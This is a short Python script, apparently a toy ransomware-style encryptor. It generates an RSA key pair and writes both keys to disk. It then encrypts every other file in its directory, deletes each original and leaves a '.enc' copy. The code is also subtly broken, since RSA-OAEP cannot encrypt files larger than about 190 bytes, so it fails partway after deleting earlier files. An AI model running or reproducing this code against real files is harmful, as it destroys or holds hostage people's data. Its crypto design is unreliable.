from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import os

list = os.listdir(path='.')
list.remove("Key_Encrypt.py")
list.remove("Decrypt_key.py")
print(list)

# Generating a key
private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
public_key = private_key.public_key()

# Storing the keys
key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
privkey = open('private_key.pem', 'wb')
privkey.write(key)

key = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
pubkey = open('public_key.pem', 'wb')
pubkey.write(key)
key = ""
for x in list:
    # Encrypting
    file = open(x, "rb")
    encrypt = public_key.encrypt(
        file.read(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    file.close()
    file = ""

    # Delete Originals and make new encrypted file
    os.remove(x)
    filename = str(x + ".enc")
    encryptedFile = open(filename, "wb")
    encryptedFile.write(encrypt)
    encryptedFile.close()
    encryptedFile = ""